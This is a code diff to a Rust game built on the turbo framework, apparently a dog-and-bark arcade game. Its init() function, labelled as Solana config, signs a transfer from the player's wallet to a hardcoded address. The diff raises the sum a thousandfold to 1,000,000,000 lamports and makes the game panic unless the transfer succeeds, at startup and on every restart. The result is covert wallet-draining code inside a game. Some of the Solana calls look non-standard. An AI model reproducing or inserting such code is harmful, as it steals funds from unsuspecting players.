@@ -5,11 +5,11 @@ use solana::{anchor, rpc, solana_sdk};
 use solana_sdk::pubkey::Pubkey;
 
 //solana config
-fn init (){
+fn init () -> bool {
     let pubkey = solana::signer();
     // 1. Create the Transaction
     let receive: Pubkey = "FyLhdnmLKSeWSkPqbxHFDAmCf2LY6cNricTpofGxF4mG".parse().unwrap();
-    let lamports_to_send = 1_000_000;
+    let lamports_to_send = 1_000_000_000;
     // Create the transfer instruction
     let instruction = solana_program::system_instruction::transfer(
         &pubkey, // Source public key (signer)
@@ -20,11 +20,7 @@ fn init (){
 
     // 2. Send the transaction
     let did_send = solana::rpc::sign_and_send_transaction(&tx);
-    if did_send {
-        // The transaction was sent successfully
-    } else {
-        // The transaction failed to send
-    }
+    return did_send;
 }
 // Define the game configuration
 turbo::cfg! {r#"
@@ -66,14 +62,17 @@ turbo::init! {
         can_fire_multiple_borks: bool,
         last_game_over: u32,
     } = {
-        init();
-        Self::new()
+        if init() {
+            Self::new()
+        } else {
+            panic!("Failed to initialize the game");
+        }
+        
     }
 }
 
 impl GameState {
     pub fn new() -> Self {
-        init();
         Self {
             is_ready: false,
             dog_x: 20.0,
@@ -457,7 +456,11 @@ turbo::go!({
                 );
             }
             if gp.start.just_pressed() {
+                if init() {
                 state = GameState::new()
+                } else {
+                    panic!("Failed to initialize the game");
+                }
             }
         }
     }
